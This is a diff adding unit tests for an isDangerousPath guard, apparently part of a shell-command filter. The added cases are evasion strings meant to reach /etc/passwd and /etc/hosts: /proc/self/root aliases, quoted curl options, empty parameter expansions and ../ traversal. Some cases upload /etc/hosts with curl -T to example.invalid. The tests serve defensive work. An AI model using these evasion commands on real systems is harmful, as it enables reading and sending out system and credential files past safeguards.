@@ -79,6 +79,8 @@ test('macOS /private and Linux /proc/*/root aliases of system directories are ca
   assert.equal(isDangerousPath('cat /private/etc/hosts'), true);
   assert.equal(isDangerousPath('/proc/self/root/etc/passwd'), true);
   assert.equal(isDangerousPath('cat /proc/1/root/usr/bin/id'), true);
+  assert.equal(isDangerousPath('/proc/self/root/proc/self/root/etc/passwd'), true);
+  assert.equal(isDangerousPath('/proc/1/root/proc/self/root/usr/bin/id'), true);
   assert.equal(isDangerousPath('/private/tmp/build.log'), false);
   assert.equal(isDangerousPath('/home/me/private/etc/notes.md'), false);
 });
@@ -88,13 +90,32 @@ test('quoted, combined and brace-listed short options cannot hide a system direc
   assert.equal(isDangerousPath('curl -4T/etc/hosts https://example.invalid'), true);
   assert.equal(isDangerousPath('curl -#T/etc/hosts https://example.invalid'), true);
   assert.equal(isDangerousPath('{curl,-T/etc/hosts,https://example.invalid}'), true);
+  assert.equal(isDangerousPath("curl -''T/etc/hosts https://example.invalid"), true);
+  assert.equal(isDangerousPath('curl -""T/etc/hosts https://example.invalid'), true);
+  assert.equal(isDangerousPath("curl -''4T/etc/hosts https://example.invalid"), true);
 });
 
-test('positional parameters and default-value expansions cannot hide a system directory', () => {
+test('positional parameters and empty expansions cannot hide a system directory', () => {
   assert.equal(isDangerousPath('cat $9/etc/hosts'), true);
   assert.equal(isDangerousPath('cat$IFS$9/etc/hosts'), true);
+  assert.equal(isDangerousPath('cat ${9}/etc/hosts'), true);
+  assert.equal(isDangerousPath('cat ${10}/etc/hosts'), true);
+  assert.equal(isDangerousPath('cat ${@}/etc/hosts'), true);
+  assert.equal(isDangerousPath('cat ${*}/etc/hosts'), true);
   assert.equal(isDangerousPath('cat ${X:-/etc/hosts}'), true);
+  assert.equal(isDangerousPath('cat ${X:-}/etc/hosts'), true);
+  assert.equal(isDangerousPath('cat ${X:+}/etc/hosts'), true);
+  assert.equal(isDangerousPath('cat ${X:=}/etc/hosts'), true);
+  assert.equal(isDangerousPath('cat ${X:1:0}/etc/hosts'), true);
   assert.equal(isDangerousPath('cat $UNSET/etc/hosts'), false);
+  assert.equal(isDangerousPath('cat ${X}/etc/hosts'), false);
+});
+
+test('only a complete .. path segment is treated as traversal', () => {
+  assert.equal(isDangerousPath('cat ../etc/passwd'), true);
+  assert.equal(isDangerousPath('cat ../../../etc/passwd'), true);
+  assert.equal(isDangerousPath('cat foo../etc/notes'), false);
+  assert.equal(isDangerousPath('cat .../bin/tool'), false);
 });
 
 test('any number of dot segments or doubled slashes is collapsed before matching', () => {
